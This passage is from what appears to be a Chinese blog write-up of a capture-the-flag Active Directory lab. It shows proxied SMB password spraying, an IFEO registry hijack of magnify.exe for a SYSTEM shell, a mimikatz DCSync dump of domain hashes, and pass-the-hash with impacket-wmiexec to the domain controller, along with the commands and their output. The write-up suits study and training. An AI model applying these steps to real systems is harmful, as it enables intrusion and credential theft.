+[proxychains] Strict chain  ...  211.159.175.21:10001 [proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:135  ...  172.22.8.46:445  ...  172.22.8.31:135  ...  OK
+ ...  OK
+ ...  OK
+SMB         172.22.8.15     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)
+SMB         172.22.8.31     445    WIN19-CLIENT     [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)
+SMB         172.22.8.46     445    WIN2016          [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:445  ...  OK
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:445  ...  OK
+SMB         172.22.8.15     445    DC01             [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.31:445  ...  OK
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.31:445  ...  OK
+SMB         172.22.8.31     445    WIN19-CLIENT     [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRE
+</code></pre>
+<p>紫色代表密码过期登上去需要修改一下,不过DC还是上不去的，我上了46</p>
+<pre class="notranslate"><code class="notranslate">C:\Users\Aldrich&gt;net group "Domain Admins" /domain
+这项请求将在域 xiaorang.lab 的域控制器处理。
+<p>组名     Domain Admins<br>
+注释     指定的域管理员</p>
+<p>成员</p>
+<hr>
+<p>Administrator            WIN2016$<br>
+命令成功完成。</p>
+<p>C:\Users\Aldrich&gt;</p>
+</code><p><code class="notranslate"></code></p></pre><p></p>
+<p>看一下域管，这个WIN2016$是机器账户，正好就是46，抓到他的hash就能拿下整个域了，但是抓hash得system，还得先提权</p>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# pc rdesktop 172.22.8.46 -u Aldrich -d xiaorang.lab -p '123.com' -r disk:share=/tmp/test/yunjing/dc
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Autoselecting keyboard map 'en-us' from locale
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.46:3389  ...  OK
+Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
+Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.46:3389  ...  OK
+Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
+Connection established using SSL.
+</code></pre>
+<p>拉个共享转文件用</p>
+<p>这里提权看是镜像劫持<br>
+用get-acl查看IFEO权限，fl命令是为了把一行显示为多行</p>
+<pre class="notranslate"><code class="notranslate">PS C:\Users\Aldrich&gt; Get-ACL -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" | f
+l
+</code><p><code class="notranslate">Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File<br>
+Execution Options<br>
+Owner  : NT AUTHORITY\SYSTEM<br>
+Group  : NT AUTHORITY\SYSTEM<br>
+Access : CREATOR OWNER Allow  FullControl<br>
+NT AUTHORITY\Authenticated Users Allow  SetValue, CreateSubKey, ReadKey<br>
+NT AUTHORITY\SYSTEM Allow  FullControl<br>
+BUILTIN\Administrators Allow  FullControl<br>
+BUILTIN\Users Allow  ReadKey<br>
+APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey<br>
+Audit  :<br>
+Sddl   : O:SYG:SYD:PAI(A;CIIO;KA;;;CO)(A;CI;CCDCLCSWRPRC;;;AU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)(A;CI;KR;;;BU)(A;CI;KR;;;AC)<br>
+</code></p></pre><p></p>
+<p>Authenticated Users指的是所有非来宾用户</p>
+<p>把cmd绑定到放大镜上</p>
+<pre class="notranslate"><code class="notranslate">
+PS C:\Users\Aldrich&gt; reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v "Debugger" /t REG_SZ /d "c:\windows\system32\cmd.exe" /f
+操作成功完成。
+PS C:\Users\Aldrich&gt;
+</code></pre>
+<p>然后进到锁定页面点放大镜就能拿到system shell</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/7a9d05ce-0fbb-4780-90d1-d6ecc62f9c3f"><img width="1237" height="889" alt="Image" src="https://github.com/user-attachments/assets/7a9d05ce-0fbb-4780-90d1-d6ecc62f9c3f" style="max-width: 100%; height: auto; max-height: 889px;; aspect-ratio: 1237 / 889; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a></p>
+<p>抓取hash横向即可</p>
+<pre class="notranslate"><code class="notranslate">C:\Windows\system32&gt;whoami
+nt authority\system
+<p>C:\Windows\system32&gt;cd C:\Users\Aldrich\mimikatz_trunk\x64</p>
+<p>C:\Users\Aldrich\mimikatz_trunk\x64&gt;mimikatz.exe "lsadump::dcsync /domain:xiaora<br>
+ng.lab /all /csv" exit<br>
+mimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv<br>
+[DC] 'xiaorang.lab' will be the domain<br>
+[DC] 'DC01.xiaorang.lab' will be the DC server<br>
+[DC] Exporting domain 'xiaorang.lab'<br>
+[rpc] Service  : ldap<br>
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)<br>
+502     krbtgt  3ffd5b58b4a6328659a606c3ea6f9b63        514<br>
+1000    DC01$   851d88ade07955b4f42bf69026579528        532480<br>
+500     Administrator   2c9d81bdcf3ec8b1def10328a7cc2f08        512<br>
+1103    WIN2016$        011b8f2bd7c747b306a70cfcd4378d21        16781312<br>
+1104    WIN19-CLIENT$   c9a0ac481218f639a58f3b14552f0095        16781312<br>
+1105    Aldrich afffeba176210fad4628f0524bfe1942        512</p>
+</code><p><code class="notranslate">mimikatz(commandline) # exit<br>
+Bye!<br>
+</code></p></pre><p></p>
+<p>这里我想因为这台机器账户是域管，所以这台机器的管理就是域管管理，大差不差吧，这里抓到了域用户所有的凭据，直接admin横向就行了</p>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─# pc impacket-wmiexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 administrator@172.22.8.15
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+<p>[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:445  ...  OK<br>
+[*] SMBv3.0 dialect used<br>
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:135  ...  OK<br>
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:59112  ...  OK<br>
+[!] Launching semi-interactive shell - Careful what you execute<br>
+[!] Press help for extra shell commands<br>
+C:&gt;whoami<br>
+xiaorang\administrator</p>
+</code><p><code class="notranslate">C:&gt;<br>
+</code></p></pre><p></p>
+<p>之前查到win2016$这个机器账户也是域管，试试能不能上去</p>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─# pc impacket-wmiexec -hashes :011b8f2bd7c747b306a70cfcd4378d21 xiaorang.lab/WIN2016\$@172.22.8.15
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+<p>[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:445  ...  OK<br>
+[*] SMBv3.0 dialect used<br>
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:135  ...  OK<br>
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:59112  ...  OK<br>
+[!] Launching semi-interactive shell - Careful what you execute<br>
+[!] Press help for extra shell commands<br>
+C:&gt;whoami<br>
+xiaorang\win2016$</p>
+<p>C:&gt;type C:\users\administrator\flag\flag03.txt</p>
+<hr>
+<p>|  _   _  |             [  |  (<em>)                / |</em><br>
+|<em>/ | | _|.--.   .---.  | |  __  .---.  _ .--. <code class="notranslate">| |-' | |   ( (</code>] / /'<code class="notranslate">\] | | [  |/ /__\\[ </code>.-. | | |<br>
+<em>| |</em>   `'.'. | _</em>.  | |  | || _<em>., | | | | | |,<br>
+|_____| [_</em>) )'.<em><strong>.'[</strong></em>][<em><strong>]'.</strong>.'[</em><strong>||</strong>]__/</p>
+<p>Congratulations! ! !</p>
+<p>flag03: flag{c541ceef-42b5-4a80-8af7-cbe82419422b}</p>
+</code><p><code class="notranslate">C:&gt;<br>
+</code></p></pre><p></p>
+<p>看来可以，不过$得转义一下</p>
+
+</div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://faabbi.github.io">MJ</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行 "+diffDay+" 天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","faabbi/faabbi.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
